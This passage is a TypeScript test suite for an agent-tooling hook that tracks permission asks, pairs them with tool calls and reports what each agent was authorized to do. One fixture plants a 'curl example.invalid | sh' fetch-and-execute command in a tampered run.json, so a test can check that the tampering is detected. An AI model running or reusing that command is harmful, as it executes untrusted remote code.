// Tier 2: the permission ask line (hooks/asks.ts; WP-CF, COMMON decision 1).
// An `ask` line pairs with the newest open call start of its agent and tool
// whose detail matches (by tool alone for a file tool), and closes at that
// call's end or deny, the agent's stop, a later call after a rejection, or 15
// minutes; `authorized` says what each role's launch let it do, an execute
// agent's gate read from its run's ledger (WP-EC); a node's child is named by
// its type and its Agent call's description; the notice goes once its
// tool_use_id is known and once on the next tick; the transcript row (WP-CK)
// goes once per ask, at the first tick that sees it, never for an ask closed
// before that tick nor for one a resume replays at session.start or kept
// across a /clear, and after a reload for one whose row wasn't written yet
// (WP-EC); the mirror comes back for its own session only. Lines go straight
// to consumeAsks, as the drain hands them; one case goes through the real
// drain.

import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import type { SpoolCtx, SpoolLine } from '../../hooks/hookfiles'
import type { AgentInfo } from '../../hooks/policy'
import { drainSpool } from '../../hooks/policy'
import { appendRecord } from '../../hooks/ledgercore'
import { agentPolicyPath, runDir, runJsonPath, spoolDir, spoolPath } from '../../hooks/layout'
import { runJsonChanged } from '../../hooks/runjson'
import {
  ASK_STALE_MS,
  ASKS_STORE_KEY,
  CALLS_PER_AGENT,
  MIRROR_FRESH_MS,
  askLine,
  askText,
  asksTick,
  consumeAsks,
  openAsks,
  resetAsksForTests,
  restoreAsks,
} from '../../hooks/asks'
import { nodePorts, scratch, type TestPorts } from './support/node-ports'
import { startedRunJson } from './support/runjson'

const NOW = 1_800_000_000_000
const TS = NOW / 1000
const RUN = '20261005-retry'
const FANOUT = '20261005-split'
const SESSION = 'test-session'

let p: TestPorts
let dir: string
let ctx: SpoolCtx
let cleanup: () => void

beforeEach(() => {
  resetAsksForTests()
  const s = scratch()
  dir = s.dir
  cleanup = s.cleanup
  p = nodePorts()
  p.clock.now = NOW
  ctx = { p, litterDir: dir, sessionId: SESSION }
})

afterEach(() => {
  resetAsksForTests()
  cleanup()
})

// ---------------------------------------------------------------------------
// Lines, as the hooks spool them

const base = (ev: string, ts: number) => ({ v: 1, ev, ts, session_id: SESSION })
const start = (agent: string, tool: string, toolUseId: string, detail?: string, ts = TS) =>
  ({ ...base('call', ts), agent_id: agent, agent_type: 'litter:executor', tool, tool_use_id: toolUseId, phase: 'start', ...(detail === undefined ? {} : { detail }) }) as SpoolLine
const end = (agent: string, toolUseId: string, ts = TS, failed = false) =>
  ({ ...base('call', ts), agent_id: agent, agent_type: 'litter:executor', tool: 'Bash', tool_use_id: toolUseId, phase: 'end', failed }) as SpoolLine
const deny = (agent: string | null, toolUseId: string, ts = TS) =>
  ({ ...base('deny', ts), agent_id: agent, agent_type: 'litter:executor', tool: 'Bash', tool_use_id: toolUseId, reason: 'litter guard: no' }) as SpoolLine
const stop = (agent: string, ts = TS) =>
  ({ ...base('stop', ts), agent_id: agent, agent_type: 'litter:executor', transcript_path: '/t', stop_hook_active: false, background_tasks: 0 }) as SpoolLine
const ask = (agent: string, tool: string, detail: string, ts = TS, agentType: string | null = 'litter:executor') =>
  ({ ...base('ask', ts), agent_id: agent, agent_type: agentType, tool, detail, mode: 'default' }) as SpoolLine

const feed = async (...lines: SpoolLine[]) => {
  for (const l of lines) await consumeAsks(ctx, l)
}

/** The agent map's entry, as consumeAgents writes it at the agent's start. */
function known(agentId: string, agentType: string, run: string | null): void {
  const role = agentType.startsWith('litter:') && !agentType.startsWith('litter:sw-') ? agentType.slice('litter:'.length) : null
  const info: AgentInfo = { agentId, agentType, role, run, cwd: '/repo', started: NOW - 60_000, stopped: null, sessionId: SESSION, transcriptPath: '/t' }
  p.storeMap.set(`litter.agent.${agentId}`, info)
}

function writeJson(path: string, value: unknown): void {
  mkdirSync(join(path, '..'), { recursive: true })
  writeFileSync(path, `${JSON.stringify(value)}\n`)
}

/** An execute run's run.json: its verify argv and its gates' Files, as run.start writes them, with its run.start. */
async function executeRun(): Promise<void> {
  mkdirSync(runDir(dir, RUN), { recursive: true })
  await startedRunJson(p, runDir(dir, RUN), {
    v: 1,
    run: RUN,
    workflow: 'execute',
    verify: ['npm', 'test'],
    args: { verifyCommand: 'npm test', gates: [{ id: 'G1', files: ['src/a.ts'] }, { id: 'G2', files: ['lib/**', 'tests/**'] }] },
    authorized: ['edit lib'],
  })
}

/** A gate's land record in the execute run's ledger, as land.ts appends it. */
const land = (gate: string) =>
  appendRecord(p, runDir(dir, RUN), { run: RUN, kind: 'land', by: { source: 'mod' }, body: { gate, verify_id: `v-${gate}`, commit: 'c0ffee', tree: 't', old: 'o', ref: `refs/heads/litter/${RUN}` } })

const only = () => {
  const open = openAsks()
  expect(open).toHaveLength(1)
  return open[0]!
}

// ---------------------------------------------------------------------------

describe('pairing', () => {
  test('a Bash ask pairs with the open call whose detail matches, not the newest one', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), start('a1', 'Bash', 'toolu_2', 'npm test'))
    await feed(ask('a1', 'Bash', 'npm install left-pad'))
    expect(only()).toEqual(expect.objectContaining({ agentId: 'a1', tool: 'Bash', detail: 'npm install left-pad', toolUseId: 'toolu_1', since: NOW }))
  })

  test('a file tool pairs by tool alone, the call start carrying no detail', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'ls'), start('a1', 'Write', 'toolu_2'))
    await feed(ask('a1', 'Write', '/repo/lib/a.ts'))
    expect(only()).toEqual(expect.objectContaining({ tool: 'Write', detail: '/repo/lib/a.ts', toolUseId: 'toolu_2' }))
  })

  test("of two open calls alike, the newest pairs first, and a second ask takes the other; another agent's call never pairs", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), start('a1', 'Bash', 'toolu_2', 'make'), start('a2', 'Bash', 'toolu_3', 'make'))
    await feed(ask('a1', 'Bash', 'make'))
    expect(only().toolUseId).toBe('toolu_2')
    await feed(ask('a1', 'Bash', 'make', TS + 1))
    expect(openAsks().map(e => e.toolUseId)).toEqual(['toolu_1', 'toolu_2'])
    await feed(ask('a1', 'Bash', 'make', TS + 2))
    expect(openAsks().map(e => e.toolUseId)).toEqual([null, 'toolu_1', 'toolu_2'])
  })

  test('with no matching call the entry opens unpaired, and no notice goes', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'ls'), start('a1', 'Read', 'toolu_2'))
    await feed(ask('a1', 'Bash', 'npm install'))
    expect(only().toolUseId).toBeNull()
    expect(p.notices).toEqual([])
  })

  test('a call that ended or was denied pairs no more; only the last 20 per agent are kept', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), end('a1', 'toolu_1'))
    await feed(start('a1', 'Bash', 'toolu_2', 'make'), deny('a1', 'toolu_2'))
    await feed(ask('a1', 'Bash', 'make'))
    expect(only().toolUseId).toBeNull()
    resetAsksForTests()
    p.storeMap.clear()
    for (let i = 0; i <= CALLS_PER_AGENT; i++) await feed(start('a1', 'Bash', `toolu_${i}`, i === 0 ? 'first' : 'later'))
    await feed(ask('a1', 'Bash', 'first'))
    expect(only().toolUseId).toBeNull()
  })

  test("two alike in one second are a batch's two asks, each with its key; a line delivered again after a reload is the one the mirror kept", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), start('a1', 'Bash', 'toolu_2', 'make'))
    await feed(ask('a1', 'Bash', 'make'), ask('a1', 'Bash', 'make'))
    const both = openAsks()
    expect(both.map(e => [e.key, e.toolUseId])).toEqual([
      ['a1@1800000000#2', 'toolu_1'],
      ['a1@1800000000', 'toolu_2'],
    ])
    // A crash between delivery and the spool's removal: the drain hands the line over again.
    resetAsksForTests()
    await feed(ask('a1', 'Bash', 'make'))
    expect(openAsks()).toEqual(both)
  })

  test('the newest is first; texts are cleaned and cut', async () => {
    await feed(ask('a1', 'Bash', 'older', TS - 30), ask('a2', 'Bash', `a\u001b[31mred\u0007${'x'.repeat(200)}`, TS - 10))
    const [first, second] = openAsks()
    expect([first!.agentId, second!.agentId]).toEqual(['a2', 'a1'])
    expect(first!.detail).not.toContain('\u001b')
    expect(first!.detail.length).toBeLessThanOrEqual(120)
  })
})

describe('closing', () => {
  test("its call's end closes it, a failed end too; another call's end closes nothing", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), start('a1', 'Bash', 'toolu_2', 'ls'))
    await feed(ask('a1', 'Bash', 'make'), ask('a1', 'Bash', 'ls'))
    expect(openAsks()).toHaveLength(2)
    await feed(end('a1', 'toolu_9'))
    expect(openAsks()).toHaveLength(2)
    await feed(end('a1', 'toolu_1'))
    expect(openAsks().map(e => e.toolUseId)).toEqual(['toolu_2'])
    await feed(end('a1', 'toolu_2', TS, true))
    expect(openAsks()).toEqual([])
  })

  test('a deny of its call closes it, with or without the agent named', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    await feed(deny('a1', 'toolu_1'))
    expect(openAsks()).toEqual([])
    await feed(start('a1', 'Bash', 'toolu_2', 'make'), ask('a1', 'Bash', 'make', TS + 5))
    await feed(deny(null, 'toolu_2'))
    expect(openAsks()).toEqual([])
  })

  test("its agent's stop closes every ask of that agent, and no other's", async () => {
    await feed(ask('a1', 'Bash', 'make'), ask('a1', 'Write', '/repo/x'), ask('a2', 'Bash', 'make'))
    await feed(stop('a1'))
    expect(openAsks().map(e => e.agentId)).toEqual(['a2'])
  })

  test('a later call of the same agent closes it (a rejected dialog raises nothing); a sibling started within a second does not', async () => {
    await feed(start('a1', 'Read', 'toolu_1'), ask('a1', 'Read', '/etc/hosts'))
    // The batch's other calls start side by side with the asking one.
    await feed(start('a1', 'Read', 'toolu_2', undefined, TS), start('a1', 'Grep', 'toolu_3', undefined, TS + 1))
    await feed(start('a2', 'Bash', 'toolu_4', 'make', TS + 30))
    expect(only().toolUseId).toBe('toolu_1')
    // After you rejected it, the model's next call.
    await feed(start('a1', 'Bash', 'toolu_5', 'make', TS + 20))
    expect(openAsks()).toEqual([])
  })

  test('15 minutes open: the tick closes it as stale and logs it; an ask line that old is never opened', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    p.clock.now = NOW + ASK_STALE_MS
    await asksTick(p)
    expect(openAsks()).toHaveLength(1)
    p.clock.now = NOW + ASK_STALE_MS + 1
    await asksTick(p)
    expect(openAsks()).toEqual([])
    expect(p.logs.filter(l => l.includes('closed as stale'))).toHaveLength(1)
    await feed(ask('a1', 'Bash', 'make', TS))
    expect(openAsks()).toEqual([])
    expect(p.logs.filter(l => l.includes('not shown (stale)'))).toHaveLength(1)
  })

  test("calls older than 15 minutes are forgotten at the tick and pair no more", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'))
    p.clock.now = NOW + ASK_STALE_MS + 1_000
    await asksTick(p)
    await feed(ask('a1', 'Bash', 'make', TS + ASK_STALE_MS / 1000))
    expect(only().toolUseId).toBeNull()
  })
})

describe('authorized, run, role, gate, swarm and node', () => {
  test("an execute executor: its run, the gate in progress from the run's ledger, the verify command and the gate's Files", async () => {
    await executeRun()
    await land('G1')
    known('a1', 'litter:executor', RUN)
    await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad'))
    const e = only()
    expect(e).toEqual(expect.objectContaining({ run: RUN, role: 'executor', gate: 'G2', swarm: null, node: null, authorized: 'verify npm test · Files lib/** tests/**' }))
    expect(askText(e)).toBe('G2 executor wants Bash: npm install left-pad · authorized: verify npm test · Files lib/** tests/**')
  })

  test("the gate is the first of the run's gates with no land, not the agent list's label (2.1.299 lists no workflow agent)", async () => {
    await executeRun()
    known('a1', 'litter:executor', RUN)
    // A label the list might show is never read: the ledger says G1 hasn't landed.
    p.agents = [{ id: 'a1', description: 'write:G2#1', type: 'litter:executor', status: 'running' }]
    await feed(ask('a1', 'Bash', 'make'))
    expect(only()).toEqual(expect.objectContaining({ gate: 'G1', authorized: 'verify npm test · Files src/a.ts' }))
    // A land of a gate the run doesn't have changes nothing; G1's moves it on.
    await land('G9')
    await feed(ask('a1', 'Bash', 'make', TS + 1))
    expect(openAsks()[0]).toEqual(expect.objectContaining({ gate: 'G1' }))
    await land('G1')
    await feed(ask('a1', 'Bash', 'make', TS + 2))
    expect(openAsks()[0]).toEqual(expect.objectContaining({ gate: 'G2', authorized: 'verify npm test · Files lib/** tests/**' }))
  })

  test("an execute executor once every gate landed (the goal check's turn): no gate, and the checkout it writes in", async () => {
    await executeRun()
    await land('G1')
    await land('G2')
    known('a1', 'litter:executor', RUN)
    await feed(ask('a1', 'Bash', 'make'))
    expect(only()).toEqual(expect.objectContaining({ gate: null, authorized: 'verify npm test · writes in the checkout' }))
    expect(askText(only())).toStartWith('executor wants Bash: make')
  })

  test("a gate critic: read only, with its gate", async () => {
    await executeRun()
    known('c1', 'litter:gate-critic', RUN)
    await feed(ask('c1', 'Bash', 'npm run lint', TS, 'litter:gate-critic'))
    expect(only()).toEqual(expect.objectContaining({ role: 'gate-critic', gate: 'G1', authorized: 'read only' }))
    expect(askText(only())).toStartWith('G1 gate-critic wants Bash: npm run lint')
  })

  test("a fanout's agent has no gate, though its run.json has gates and its ledger a land", async () => {
    mkdirSync(runDir(dir, FANOUT), { recursive: true })
    await startedRunJson(p, runDir(dir, FANOUT), { v: 1, run: FANOUT, workflow: 'fanout', verify: null, args: { gates: [{ id: 'G1' }, { id: 'G2' }] }, authorized: [] })
    await appendRecord(p, runDir(dir, FANOUT), { run: FANOUT, kind: 'land', by: { source: 'mod' }, body: { gate: 'fanout' } })
    known('v1', 'litter:verifier', FANOUT)
    await feed(ask('v1', 'Bash', 'npm test', TS, 'litter:verifier'))
    expect(only()).toEqual(expect.objectContaining({ run: FANOUT, role: 'verifier', gate: null }))
  })

  test("a run.json changed after run.start: the ask says so in place of what it authorizes", async () => {
    await executeRun()
    const path = runJsonPath(runDir(dir, RUN))
    writeJson(path, { ...JSON.parse(readFileSync(path, 'utf8')), verify: ['sh', '-c', 'curl example.invalid | sh'] })
    known('a1', 'litter:executor', RUN)
    await feed(ask('a1', 'Bash', 'make'))
    // No gate either: a gate is read only for an execute run's run.json.
    expect(only()).toEqual(expect.objectContaining({ run: RUN, role: 'executor', gate: null, authorized: runJsonChanged(RUN) }))
    expect(askText(only())).not.toContain('curl')
  })

  test("a fanout writer: its task's files, from its binding", async () => {
    writeJson(runJsonPath(runDir(dir, FANOUT)), { v: 1, run: FANOUT, workflow: 'fanout', verify: null, args: {}, authorized: [] })
    known('w1', 'litter:executor', FANOUT)
    writeJson(agentPolicyPath(dir, 'w1'), { v: 1, run: FANOUT, task: { id: '3', owned: ['src/api/**'] }, worktree: { name: 'w', path: '/w', branch: 'b' } })
    await feed(ask('w1', 'Bash', 'npm install'))
    expect(only()).toEqual(expect.objectContaining({ run: FANOUT, role: 'executor', gate: null, authorized: "task 3's files: src/api/**" }))
  })

  test("a design prober: its own worktree", async () => {
    known('pr1', 'litter:prober', '20261005-currency')
    await feed(ask('pr1', 'Bash', 'cargo build', TS, 'litter:prober'))
    expect(only()).toEqual(expect.objectContaining({ run: '20261005-currency', role: 'prober', authorized: 'writes in its own worktree' }))
  })

  test("a node: its swarm, node and write scope under its directory; a child: its node's", async () => {
    const node = { swarm: 'review', launch: 'l1', node: 'fixer', n: 1, kind: 'worker', of: null, type: 'litter:sw-review-fixer', parent: 'o1', generation: 1, dir: '/repo', paths: ['/repo/server/', '/repo/README.md'], protect: [], branch: null, authority: {}, toolsDeny: [], bashDeny: [], spawns: [], spawnOther: false, admitted: true, stopped: null, bind: false }
    writeJson(agentPolicyPath(dir, 'n1'), { v: 1, node })
    writeJson(agentPolicyPath(dir, 'k1'), { v: 1, node: { ...node, kind: 'child', n: 0, of: 'n1', parent: 'n1', paths: null } })
    known('n1', 'litter:sw-review-fixer', null)
    // The node's own description is never its name; the child's names it.
    p.agents = [
      { id: 'n1', description: 'node fixer', type: 'litter:sw-review-fixer', status: 'running' },
      { id: 'k1', description: 'write the parser fix', type: 'general-purpose', status: 'running', parentId: 'n1' },
    ]
    await feed(ask('n1', 'Bash', 'git push', TS - 1, 'litter:sw-review-fixer'), ask('k1', 'Write', '/repo/x', TS, 'general-purpose'))
    const [child, fixer] = openAsks()
    expect(fixer).toEqual(expect.objectContaining({ run: null, role: null, swarm: 'review', node: 'fixer', description: null, authorized: 'write scope server/ README.md' }))
    expect(child).toEqual(expect.objectContaining({ swarm: 'review', node: 'fixer', description: 'write the parser fix', authorized: 'write scope anywhere' }))
    expect(askText(fixer!)).toBe('node fixer of swarm review wants Bash: git push · authorized: write scope server/ README.md')
    expect(askText(child!)).toBe('general-purpose child "write the parser fix" of node fixer of swarm review wants Write: /repo/x · authorized: write scope anywhere')
    // The mirror keeps it across a reload.
    resetAsksForTests()
    await restoreAsks(p)
    expect(openAsks().map(e => e.description)).toEqual(['write the parser fix', null])
  })

  test("a node's child the list doesn't have, or has with no description, is named by its type; a long or dirty description is cleaned and cut", async () => {
    const node = { swarm: 'review', launch: 'l1', node: 'fixer', n: 0, kind: 'child', of: 'n1', type: 'litter:sw-review-fixer', parent: 'n1', generation: 1, dir: '/repo', paths: null, protect: [], branch: null, authority: {}, toolsDeny: [], bashDeny: [], spawns: [], spawnOther: false, admitted: true, stopped: null, bind: false }
    for (const id of ['k1', 'k2', 'k3']) writeJson(agentPolicyPath(dir, id), { v: 1, node })
    p.agents = [
      { id: 'k2', description: '  ', type: 'Explore', status: 'running' },
      { id: 'k3', description: `find\u001b[31m the${' parser'.repeat(20)}`, type: 'Explore', status: 'running' },
    ]
    await feed(ask('k1', 'Bash', 'ls', TS - 2, 'Explore'), ask('k2', 'Bash', 'ls', TS - 1, 'Explore'), ask('k3', 'Bash', 'ls', TS, 'Explore'))
    const [k3, k2, k1] = openAsks()
    expect(askText(k1!)).toStartWith('Explore child of node fixer of swarm review wants Bash: ls')
    expect(askText(k2!)).toStartWith('Explore child of node fixer of swarm review wants Bash: ls')
    expect(k3!.description).not.toContain('\u001b')
    expect(k3!.description!.length).toBeLessThanOrEqual(60)
    expect(askText(k3!)).toStartWith(`Explore child "${k3!.description}" of node fixer`)
    // A list that can't be read: the type alone, and the ask still opens.
    p.listAgents = async () => {
      throw new Error('agent.list refused')
    }
    await feed(ask('k1', 'Bash', 'pwd', TS + 1, 'Explore'))
    expect(askText(openAsks()[0]!)).toStartWith('Explore child of node fixer of swarm review wants Bash: pwd')
  })

  test("an unreadable binding or run.json is logged, and the ask still opens", async () => {
    mkdirSync(join(dir, 'hooks', 'agents'), { recursive: true })
    writeFileSync(agentPolicyPath(dir, 'a1'), '{ not json')
    known('a1', 'litter:executor', RUN)
    mkdirSync(runDir(dir, RUN), { recursive: true })
    writeFileSync(runJsonPath(runDir(dir, RUN)), 'nope')
    await feed(ask('a1', 'Bash', 'make'))
    expect(only()).toEqual(expect.objectContaining({ run: RUN, role: 'executor', authorized: 'writes in the checkout' }))
    expect(p.logs.some(l => l.includes('agents/a1.json is unreadable'))).toBe(true)
  })

  test('an agent id that could reach a path opens nothing', async () => {
    await feed(ask('../a1', 'Bash', 'make'))
    expect(openAsks()).toEqual([])
  })
})

describe('the notice', () => {
  test('sent once its tool_use_id is known and once on the next tick, never after, nor after it closes', async () => {
    await executeRun()
    await land('G1')
    known('a1', 'litter:executor', RUN)
    await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad'))
    const text = '⚑ asking · G2 executor wants Bash: npm install left-pad · authorized: verify npm test · Files lib/** tests/**'
    expect(p.notices).toEqual([{ toolUseId: 'toolu_1', text }])
    await asksTick(p)
    expect(p.notices).toEqual([
      { toolUseId: 'toolu_1', text },
      { toolUseId: 'toolu_1', text },
    ])
    await asksTick(p)
    expect(p.notices).toHaveLength(2)
    // A second ask, closed before the tick: its one notice, and none after.
    await feed(start('a1', 'Bash', 'toolu_2', 'make', TS + 30), ask('a1', 'Bash', 'make', TS + 30))
    expect(p.notices).toHaveLength(3)
    await feed(end('a1', 'toolu_2', TS + 31))
    await asksTick(p)
    expect(p.notices.map(n => n.toolUseId)).toEqual(['toolu_1', 'toolu_1', 'toolu_2'])
  })

  test('a notice that throws is logged, and counts', async () => {
    p.noticeAnswer = false
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    await asksTick(p)
    await asksTick(p)
    expect(p.notices).toHaveLength(2)
    expect(p.logs.filter(l => l.includes('$.ui.notice threw'))).toHaveLength(2)
  })
})

describe('the transcript row (WP-CK)', () => {
  const LINE = '⚑ asking · G2 executor wants Bash: npm install left-pad · authorized: verify npm test · Files lib/** tests/**'
  /** What an executor with no run.json read was authorized, as every row of an unknown agent here ends. */
  const CHECKOUT = ' · authorized: writes in the checkout'

  test("one per ask, at the first tick that sees it, in the band row's words with no `litter: `; never again, across ticks and a later pairing", async () => {
    await executeRun()
    await land('G1')
    known('a1', 'litter:executor', RUN)
    await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad'))
    // The drain opens it; the tick writes the row.
    expect(p.notes).toEqual([])
    await asksTick(p)
    expect(p.notes).toEqual([LINE])
    expect(p.notes[0]).toBe(askLine(only()))
    expect(p.notes[0]).not.toStartWith('litter: ')
    await asksTick(p)
    p.clock.now = NOW + 10_000
    await asksTick(p)
    expect(p.notes).toEqual([LINE])
  })

  test('paired or not, each ask gets its row; two alike in one second are two rows; the asks after get theirs at the next tick', async () => {
    await feed(ask('a1', 'Bash', 'npm install'), start('a2', 'Bash', 'toolu_1', 'make'), start('a2', 'Bash', 'toolu_2', 'make'))
    await feed(ask('a2', 'Bash', 'make'), ask('a2', 'Bash', 'make'))
    expect(openAsks().map(e => e.toolUseId)).toEqual(['toolu_1', 'toolu_2', null])
    await asksTick(p)
    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: npm install${CHECKOUT}`, `⚑ asking · executor wants Bash: make${CHECKOUT}`, `⚑ asking · executor wants Bash: make${CHECKOUT}`])
    await feed(ask('a3', 'Write', '/repo/x', TS + 5))
    await asksTick(p)
    await asksTick(p)
    expect(p.notes).toHaveLength(4)
    expect(p.notes[3]).toBe(`⚑ asking · executor wants Write: /repo/x${CHECKOUT}`)
  })

  test('none for an ask closed before its first tick: its end, its deny or its stop in the same drain', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'), end('a1', 'toolu_1'))
    await feed(start('a2', 'Bash', 'toolu_2', 'make'), ask('a2', 'Bash', 'make'), deny('a2', 'toolu_2'))
    await feed(ask('a3', 'Bash', 'make'), stop('a3'))
    await asksTick(p)
    expect(openAsks()).toEqual([])
    expect(p.notes).toEqual([])
  })

  test('a reload (WP-EC): an ask the mirror brings back keeps its row as the earlier module left it, written or still to write', async () => {
    // A row written: the tick saved the mirror with it, so a reload right after writes no second one.
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    await asksTick(p)
    expect(p.notes).toHaveLength(1)
    expect((p.storeMap.get(ASKS_STORE_KEY) as { asks: { noted: boolean }[] }).asks.map(a => a.noted)).toEqual([true])
    resetAsksForTests()
    p.clock.now = NOW + 5_000
    await restoreAsks(p)
    await asksTick(p)
    expect(openAsks()).toHaveLength(1)
    expect(p.notes).toHaveLength(1)
    // Opened by the earlier module's drain, then a reload before its tick: its dialog is still up, so its row now, once.
    await feed(ask('a2', 'Bash', 'ls', TS + 5))
    resetAsksForTests()
    p.clock.now = NOW + 6_000
    await restoreAsks(p)
    await asksTick(p)
    await asksTick(p)
    expect(openAsks().map(e => e.agentId)).toEqual(['a2', 'a1'])
    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: make${CHECKOUT}`, `⚑ asking · executor wants Bash: ls${CHECKOUT}`])
  })

  test("the asks session.start's drain opens: a reload's, from a line under 30 s old, get their rows; a resume's, older, none", async () => {
    // A reload before the earlier module drained anything: no mirror, and the dialog is up.
    await feed(start('a1', 'Bash', 'toolu_1', 'pwd', TS - MIRROR_FRESH_MS / 1000), ask('a1', 'Bash', 'pwd', TS - MIRROR_FRESH_MS / 1000))
    await restoreAsks(p)
    await asksTick(p)
    await asksTick(p)
    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: pwd${CHECKOUT}`])
    // A resume: lines the earlier process spooled a second longer before, drained at session.start before restoreAsks.
    resetAsksForTests()
    p.storeMap.clear()
    p.notes.length = 0
    await feed(start('a3', 'Bash', 'toolu_3', 'id', TS - MIRROR_FRESH_MS / 1000 - 1), ask('a3', 'Bash', 'id', TS - MIRROR_FRESH_MS / 1000 - 1))
    await restoreAsks(p)
    await asksTick(p)
    expect(openAsks().map(e => e.agentId)).toEqual(['a3'])
    expect(p.notes).toEqual([])
    // One that opens after session.start gets its row.
    await feed(ask('a4', 'Bash', 'ls', TS + 1))
    await asksTick(p)
    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: ls${CHECKOUT}`])
  })

  test('none again after a /clear: the session id moves, the module keeps what it wrote; a new ask gets its own', async () => {
    await feed(ask('a1', 'Bash', 'make'))
    await asksTick(p)
    p.sessionId = async () => 'cleared-session'
    await asksTick(p)
    await feed(ask('a1', 'Bash', 'make', TS + 1))
    await asksTick(p)
    await asksTick(p)
    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: make${CHECKOUT}`, `⚑ asking · executor wants Bash: make${CHECKOUT}`])
    expect(openAsks()).toHaveLength(2)
  })

  test('a row that throws is logged once and not tried again; the notices still go', async () => {
    p.note = () => {
      throw new Error('no transcript')
    }
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    await asksTick(p)
    await asksTick(p)
    expect(p.logs.filter(l => l.includes("its transcript row wasn't written: no transcript"))).toHaveLength(1)
    expect(p.notices).toHaveLength(2)
  })
})

describe('the mirror', () => {
  const mirrored = () => p.storeMap.get(ASKS_STORE_KEY) as { session: string; at: number; asks: { key: string }[]; calls: Record<string, { toolUseId: string }[]> } | undefined

  test('written with the session id on every open and close, and by the tick for calls alone', async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'))
    expect(mirrored()).toBeUndefined()
    await asksTick(p)
    expect(mirrored()).toEqual(expect.objectContaining({ session: SESSION, at: NOW, asks: [] }))
    expect(mirrored()!.calls.a1!.map(c => c.toolUseId)).toEqual(['toolu_1'])
    await feed(ask('a1', 'Bash', 'make'))
    expect(mirrored()!.asks.map(a => a.key)).toEqual(['a1@1800000000'])
    await feed(end('a1', 'toolu_1'), stop('a1'))
    expect(p.storeMap.has(ASKS_STORE_KEY)).toBe(false)
  })

  test("restored for this session after a reload: the open asks, and the calls an ask then pairs with", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'), start('a2', 'Bash', 'toolu_2', 'ls'))
    await asksTick(p)
    const before = openAsks()
    // A reload: module memory gone, the store kept.
    resetAsksForTests()
    p.clock.now = NOW + 5_000
    await restoreAsks(p)
    expect(openAsks()).toEqual(before)
    await feed(ask('a2', 'Bash', 'ls', TS + 5))
    expect(openAsks().map(e => e.toolUseId)).toEqual(['toolu_2', 'toolu_1'])
    // The notices carried over: a1's ask had both before the reload, a2's new one gets its second at the tick, and that's all.
    p.notices.length = 0
    await asksTick(p)
    await asksTick(p)
    expect(p.notices.map(n => n.toolUseId)).toEqual(['toolu_2'])
  })

  test("the drain's lines at session.start apply after the mirror: an end drained first still closes a restored ask", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    resetAsksForTests()
    await feed(end('a1', 'toolu_1'))
    await restoreAsks(p)
    expect(openAsks()).toEqual([])
  })

  test("a mirror an earlier version wrote, with no description and no noted: restored, its row taken as written, and its description none", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    const saved = p.storeMap.get(ASKS_STORE_KEY) as { asks: Record<string, unknown>[] }
    const asks = saved.asks.map(({ description: _d, noted: _n, ...rest }) => rest)
    resetAsksForTests()
    p.storeMap.set(ASKS_STORE_KEY, { ...saved, asks })
    await restoreAsks(p)
    await asksTick(p)
    expect(only()).toEqual(expect.objectContaining({ agentId: 'a1', toolUseId: 'toolu_1', description: null }))
    expect(p.notes).toEqual([])
  })

  test("another session's mirror is ignored, and so is one that's not version 1", async () => {
    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
    const saved = p.storeMap.get(ASKS_STORE_KEY) as Record<string, unknown>
    resetAsksForTests()
    p.storeMap.set(ASKS_STORE_KEY, { ...saved, session: 'another-session' })
    await restoreAsks(p)
    expect(openAsks()).toEqual([])
    resetAsksForTests()
    p.storeMap.set(ASKS_STORE_KEY, { ...saved, v: 2 })
    await restoreAsks(p)
    expect(openAsks()).toEqual([])
    resetAsksForTests()
    p.storeMap.set(ASKS_STORE_KEY, { ...saved, asks: [{ key: 'x' }, 'junk'], calls: { '../a': [{}], a1: 'junk' } })
    await restoreAsks(p)
    expect(openAsks()).toEqual([])
  })

  test("asks older than 15 minutes are dropped; a mirror the tick stopped refreshing is a gone process's, and its asks aren't restored", async () => {
    await feed(ask('a1', 'Bash', 'old', TS - 600), start('a2', 'Bash', 'toolu_2', 'make'), ask('a2', 'Bash', 'make'))
    resetAsksForTests()
    p.clock.now = NOW + ASK_STALE_MS - 300_000 + 1
    // A reload soon after the last write: the old one goes, the other comes back.
    const saved = p.storeMap.get(ASKS_STORE_KEY) as Record<string, unknown>
    p.storeMap.set(ASKS_STORE_KEY, { ...saved, at: p.clock.now - 1_000 })
    await restoreAsks(p)
    expect(openAsks().map(e => e.agentId)).toEqual(['a2'])
    // A resume long after: nothing restored, and it says so.
    resetAsksForTests()
